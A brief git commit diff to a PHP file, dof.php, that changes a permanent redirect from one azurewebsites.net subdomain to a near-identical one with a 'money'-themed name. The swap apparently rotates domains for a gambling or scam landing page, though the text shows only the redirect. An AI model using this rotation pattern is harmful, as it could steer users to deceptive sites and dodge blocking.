7d12d74ec0d5b6fc84685678cbbdbfaef36b1764
monsterZD <hmjim@mail.ru>
2022-02-22 00:43:02 +0300

    'telebot'

--- dof.php
+++ dof.php
@@ -44,7 +44,7 @@ if($result === false){
 	exit(); 
 } else {
 	header( "HTTP/1.1 301 Moved Permanently" );
-	header( "Location:https://playz-na-moneyss.azurewebsites.net" . $_SERVER["REQUEST_URI"] );
+	header( "Location:https://playss-na-moneyzs.azurewebsites.net" . $_SERVER["REQUEST_URI"] );
 	exit();
 }
 
